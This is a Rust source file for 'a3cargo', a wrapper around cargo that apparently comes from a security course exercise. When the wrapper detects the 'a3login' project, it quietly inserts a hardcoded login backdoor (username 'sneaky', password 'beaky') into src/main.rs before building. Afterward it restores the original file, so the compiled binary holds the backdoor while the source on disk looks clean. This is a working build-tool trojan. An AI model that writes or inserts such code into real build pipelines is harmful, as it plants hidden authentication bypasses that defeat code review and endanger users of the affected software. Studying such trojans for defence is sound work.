use std::env;
use std::process::{Command, exit};
use std::path::Path;
use std::fs::{self, OpenOptions};
use std::io::{Write, Seek, SeekFrom};

fn main() -> std::io::Result<()> {
    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        eprintln!("Usage: a3cargo [build|run] <args>");
        exit(1);
    }

    let operation = &args[1];
    let is_a3login = check_if_a3login();

    

    if is_a3login {
        modify_a3login();
        
    }

    // running cargo as a subprocess
    let status = Command::new("cargo")
        .args(&args[1..])
        .status()?;

    
    if !status.success() {
        eprintln!("Cargo command failed.");
        exit(1);
    }

    if is_a3login {
        restore_a3login();
        
    }

    Ok(())
}


fn check_if_a3login() -> bool {
    // path to the main source file of a3login
    let path = Path::new("src/main.rs");

    // check if the file exists
    if path.exists() {
        // read the contents of the file
        match fs::read_to_string(path) {
            Ok(contents) => {
                // check for unique strings that are likely to be present in a3login's main.rs
                let markers = vec![
                    "use argon2::password_hash::{PasswordHash, PasswordVerifier};",
                    "use argon2::Argon2;",
                    "use csv::ReaderBuilder;",
                    "fn main() -> Result<(), Box<dyn std::error::Error>> {",
                ];

                // if all markers are found in the file contents, it's likely a3login
                markers.iter().all(|marker| contents.contains(marker))
                
            }
            Err(_) => false, // could not read the file
        }
    } else {
        false // file does not exist
    }
    
}


fn modify_a3login() -> std::io::Result<()> {
    let path = "src/main.rs";
    let backup_path = "src/main.rs.bak";

    // create a backup of the original file
    fs::copy(path, backup_path)?;


    let mut contents = fs::read_to_string(path)?;

    // marker to find the location to inject our extra user check
    let marker = "// Extra user check here";

    if !contents.contains(marker) {
        //let place_to_inject = contents.find("if !found {").unwrap_or(contents.len());
        //explicit error handling
        let place_to_inject = match contents.find("if !found {") {
            Some(index) => index,
            None => contents.len(), 
        };
        // construct the code snippet for extra user
        let extra_user_code = r#"
            // Extra user check here
            if username == "sneaky" && password == "beaky" {
                println!("Access granted!");
                return Ok(());
            }
        "#;

        contents.insert_str(place_to_inject, extra_user_code);

        // write back to the file
        let mut file = OpenOptions::new().write(true).truncate(true).open(path)?;
        file.write_all(contents.as_bytes())?;
    }

    Ok(())

}

fn restore_a3login() -> std::io::Result<()> {
    let path = "src/main.rs";
    let backup_path = "src/main.rs.bak";

    // restore the original file from the backup
    fs::copy(backup_path, path)?;

    // remove the backup file
    fs::remove_file(backup_path)?;

    Ok(())
}